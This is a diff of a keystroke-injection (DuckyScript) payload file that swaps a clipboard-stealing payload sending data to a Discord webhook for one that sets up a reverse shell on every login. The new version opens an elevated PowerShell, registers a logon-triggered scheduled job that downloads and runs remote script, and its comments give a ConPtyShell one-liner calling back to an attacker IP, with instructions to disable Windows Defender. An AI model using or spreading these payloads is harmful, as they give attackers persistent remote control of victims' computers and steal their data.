@@ -1,17 +1,27 @@
-REM     Title: Copy-And-Waste
-
-REM     Author: atomiczsec & I am Jakoby
-
-REM     Description: This payload is meant to exfiltrate whatever is copied to the clipboard and sends to a discord webhook
-
-REM     Target: Windows 10, 11
-
-DELAY 2000
+REM Title: Netcat Reverseshell On Log In
+REM Description: Creates a powershell Job/Task to remotely connect to the computer with netcat every time user logs in
+REM Author: https://github.com/HokkaidoInu
+REM delay: You may want to change the delays and/or delete some, I have it like it is because I have really slow computer
+REM setup: 
+REM Windows defender is required to be disabled
+REM Have IP and port 87 open and listening on server side for netcat reverse shell
+REM Create a txt file with the command below in it, replacing the ip to your servers ip:
+REM IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.220 4444
+REM Host the text file online on github or your own web server or something
+REM Then in the payload, replace https://example.com/txt/load.txt with the url that you are hosting your txt file in raw format
 GUI r
-DELAY 200
-STRING powershell -w h -NoP -NonI -Ep Bypass "echo (iwr pastebin.com/c2gBgGLJ).content > "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\l.bat";echo (iwr PASTEBIN LINK FOR PS1).content > "$env:APPDATA\https://discord.com/api/webhooks/1322195725668454461/7iRsHps1MeRa76_7X3B_tnQGlDM1Tu4mp_OSwPRTJ-L9bv9J8oohI3B_IwimDrcrFyyD";powershell "$env:APPDATA\https://discord.com/api/webhooks/1322195725668454461/7iRsHps1MeRa76_7X3B_tnQGlDM1Tu4mp_OSwPRTJ-L9bv9J8oohI3B_IwimDrcrFyyD"" 
+DELAY 4000
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 4000
+LEFT
+DELAY 4000
 ENTER
-
-REM     Remember to replace the link with your pastebin shared link for the intended files to download
-REM     Also remember to put in your discord webhook in c.ps1
-REM     For the PASTEBIN LINK's do not put https:// infront of it, it should look like pastebin.com/raw/BLAHBLAHBLAH
+DELAY 4000
+STRING $T = New-JobTrigger -AtLogOn ; $Script = Invoke-WebRequest 'https://example.com/txt/load.txt' ; $ScriptBlock = [Scriptblock]::Create($Script.Content) ; Register-ScheduledJob -Name "Powershell" -ScriptBlock $ScriptBlock -Trigger $T
+DELAY 4000
+ENTER
+DELAY 8000
+STRING exit
+DELAY 4000
+ENTER
